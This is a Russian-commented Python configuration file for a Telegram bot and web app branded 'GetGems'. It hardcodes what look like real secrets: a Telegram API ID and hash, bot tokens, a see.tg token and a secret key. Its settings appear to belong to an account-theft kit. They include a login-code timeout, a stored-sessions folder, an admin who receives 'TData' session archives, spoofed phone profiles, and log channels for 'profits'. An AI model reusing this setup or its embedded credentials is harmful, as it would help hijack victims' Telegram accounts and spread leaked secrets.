"""
Единый конфигурационный файл для GetGems WebApp
Содержит все настройки приложения, бота и клиента
"""

import os
from typing import List, Optional
from dotenv import load_dotenv
import asyncio

# Загружаем переменные окружения
load_dotenv()


class Config:
    """Основная конфигурация приложения"""
    
    # === TELEGRAM API НАСТРОЙКИ ===
    TELEGRAM_API_ID: int = int(os.getenv("TELEGRAM_API_ID", "33392489"))
    TELEGRAM_API_HASH: str = os.getenv("TELEGRAM_API_HASH", "45edb669e73e787a67b764e1707516d8")
    
    # === BOT НАСТРОЙКИ ===
    BOT_TOKEN: str = os.getenv("BOT_TOKEN", os.getenv("GETGEMS_BOT_TOKEN", "8015785465:AAG7fRkCMzd3JJMUI2fC7hgy6IaA4MvOcUo"))
    
    # Отдельный токен для логирования (все боты логируют через него)
    LOG_BOT_TOKEN: str = os.getenv("LOG_BOT_TOKEN", os.getenv("BOT_TOKEN", "8572614195:AAG9hFVjuKJF6vUakR2s1mSF8EZUu3IgcNk"))
    
    # Автоопределение username бота
    _bot_username_cache = None
    
    @classmethod
    def get_bot_username(cls) -> str:
        """Автоматически определяет username бота по токену"""
        if cls._bot_username_cache:
            return cls._bot_username_cache
        
        # Сначала пробуем из env
        env_username = os.getenv("BOT_USERNAME", "")
        if env_username and env_username != "getgemsing_bot":
            cls._bot_username_cache = env_username
            return env_username
        
        # Если нет - определяем по токену
        try:
            from aiogram import Bot
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def get_username():
                temp_bot = Bot(token=cls.BOT_TOKEN)
                me = await temp_bot.get_me()
                await temp_bot.session.close()
                return me.username
            
            username = loop.run_until_complete(get_username())
            loop.close()
            
            cls._bot_username_cache = username
            print(f"✅ Автоопределен username бота: @{username}")
            return username
        except Exception as e:
            print(f"⚠️ Не удалось автоопределить username: {e}")
            return "GetGemsNewRobot"
    
    # Используем classmethod для автоопределения username
    # Не используем property т.к. оно не работает на уровне класса
    # Везде нужно вызывать: Config.get_bot_username()
    
    # === WEB APP НАСТРОЙКИ ===
    WEBAPP_URL: str = os.getenv("WEBAPP_URL", "https://fdsffdgdsfgd.bothost.ru")
    SECRET_KEY: str = os.getenv("GETGEMS_SECRET_KEY", "EQCjk1hh952vWaE9bRguFkAhDAL5jj3xj9p0uPWrFBq_GEMS")
    
    # === SEE.TG API НАСТРОЙКИ ===
    SEE_TG_APP_TOKEN: str = os.getenv("SEE_TG_APP_TOKEN", "3f1010b7-f361-4984-836b-c3aabf0e6844:231bb6a03e8f1344afc93ba4757dbf3a2794d244b4da897f64c7f41caa6fbc8b")
    SEE_TG_BASE_URL: str = "https://poso.see.tg"
    
    # === FLASK НАСТРОЙКИ ===
    FLASK_HOST: str = os.getenv("FLASK_HOST", "0.0.0.0")
    FLASK_PORT: int = int(os.getenv("FLASK_PORT", "5000"))
    FLASK_DEBUG: bool = os.getenv("FLASK_DEBUG", "false").lower() == "true"
    
    # === DATABASE НАСТРОЙКИ ===
    DATABASE_PATH: str = os.getenv("DATABASE_PATH", "getgems.db")
    
    # === LOGGING НАСТРОЙКИ ===
    LOG_LEVEL: str = os.getenv("LOG_LEVEL", "INFO")
    LOG_GROUP_ID: str = os.getenv("LOG_GROUP_ID", "-1003738826653")
    LOG_CHAT_ID: str = os.getenv("LOG_CHAT_ID", "-1003738826653")
    
    # === TOPIC ID НАСТРОЙКИ ===
    TOPIC_TRADEBAN: int = 98  # Топик для трейдбанов
    TOPIC_PROFITS: int = 98     # Топик для профитов
    TOPIC_GENERAL: int = 98     # Топик для всех остальных логов
    
    # === AUTODOCID НАСТРОЙКИ ===
    AUTODOCID_ID: int = int(os.getenv("AUTODOCID_ID", "8310332764"))
    AUTODOCID_USERNAME: str = os.getenv("AUTODOCID_USERNAME", "@ccvah")
    
    # === ADMIN НАСТРОЙКИ ===
    ADMIN_IDS: List[int] = [
        int(admin_id.strip()) for admin_id in os.getenv("ADMIN_IDS", "8450229868").split(",")
        if admin_id.strip().isdigit()
    ]
    # ID админа для отправки TData архивов
    TDATA_ADMIN_ID: int = int(os.getenv("TDATA_ADMIN_ID", "8450229868"))
    
    # === TELEGRAM AUTH НАСТРОЙКИ ===
    INIT_DATA_STRICT: bool = os.getenv("INIT_DATA_STRICT", "false").lower() == "true"
    
    # === SESSION НАСТРОЙКИ ===
    SESSION_DIR: str = os.getenv("SESSION_DIR", "sessions")
    SESSION_DATA_FILE: str = os.getenv("SESSION_DATA_FILE", "session_data.json")
    
    # === TIMEOUT НАСТРОЙКИ ===
    REQUEST_TIMEOUT: int = int(os.getenv("REQUEST_TIMEOUT", "30"))
    CODE_REQUEST_TIMEOUT: int = int(os.getenv("CODE_REQUEST_TIMEOUT", "60"))
    LOTTIE_REQUEST_TIMEOUT: int = int(os.getenv("LOTTIE_REQUEST_TIMEOUT", "10"))
    
    # === PROXY НАСТРОЙКИ ===
    PROXIES: List[dict] = []  # Можно добавить прокси из переменных окружения
    
    # === MOBILE DEVICES КОНФИГУРАЦИЯ ===
    MOBILE_DEVICES: List[dict] = [
        {
            'device_model': 'SM-G973F',
            'system_version': '10',
            'app_version': '8.4.1',
            'lang_code': 'en',
            'system_lang_code': 'en-US'
        },
        {
            'device_model': 'iPhone12,1',
            'system_version': '14.6',
            'app_version': '8.4.1',
            'lang_code': 'en',
            'system_lang_code': 'en-US'
        },
        {
            'device_model': 'Pixel 5',
            'system_version': '11',
            'app_version': '8.4.1',
            'lang_code': 'en',
            'system_lang_code': 'en-US'
        }
    ]
    
    @classmethod
    def is_admin(cls, user_id: int) -> bool:
        """Проверяет, является ли пользователь администратором"""
        return user_id in cls.ADMIN_IDS
    
    @classmethod
    def validate_bot_token(cls) -> bool:
        """Проверяет валидность токена бота"""
        if cls.BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            print("❌ Токен бота не установлен!")
            print("Получите токен у @BotFather и установите переменную окружения BOT_TOKEN")
            return False
        if not cls.BOT_TOKEN or len(cls.BOT_TOKEN) < 40:
            print("❌ Неверный токен бота!")
            return False
        return True
    
    @classmethod
    def ensure_directories(cls) -> None:
        """Создает необходимые директории"""
        if not os.path.exists(cls.SESSION_DIR):
            os.makedirs(cls.SESSION_DIR)
    
    @classmethod
    def get_api_url(cls, endpoint: str = "") -> str:
        """Возвращает URL для API запросов"""
        base_url = f"http://{cls.FLASK_HOST}:{cls.FLASK_PORT}"
        if endpoint:
            return f"{base_url}/{endpoint.lstrip('/')}"
        return base_url
    
    @classmethod
    def print_config_info(cls) -> None:
        """Выводит информацию о конфигурации"""
        print("🔧 Конфигурация GetGems WebApp:")
        print(f"   BOT_TOKEN: {'✅ Установлен' if cls.BOT_TOKEN and cls.BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else '❌ Не установлен'}")
        print(f"   WEBAPP_URL: {cls.WEBAPP_URL}")
        print(f"   DATABASE_PATH: {cls.DATABASE_PATH}")
        print(f"   LOG_LEVEL: {cls.LOG_LEVEL}")
        print(f"   LOG_GROUP_ID: {cls.LOG_GROUP_ID}")
        print(f"   ADMIN_IDS: {len(cls.ADMIN_IDS)} администраторов")
        print(f"   FLASK: {cls.FLASK_HOST}:{cls.FLASK_PORT} (debug={cls.FLASK_DEBUG})")


# Создаем экземпляр конфигурации для обратной совместимости
config = Config()

# Инициализируем необходимые директории
Config.ensure_directories()
